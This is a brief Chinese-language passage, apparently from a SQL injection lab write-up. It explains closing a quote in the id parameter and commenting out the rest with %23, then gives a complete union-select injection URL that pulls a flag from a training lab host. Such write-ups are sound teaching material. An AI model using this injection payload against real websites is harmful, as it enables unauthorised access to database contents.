> - **给 `id` 传参加了个单引号，和上题一样的做法差不多，就是 `1` 后面加个 `'` 来闭合源代码中的单引号，再加个 `#` 号 url编码也就是 `%23` 注释掉后面的单引号，也就可以联合查询了**

```sql
http://inject2.lab.aqlab.cn:81/Pass-02/index.php?id=1' union all select 1,2,flag from error_flag %23;
```
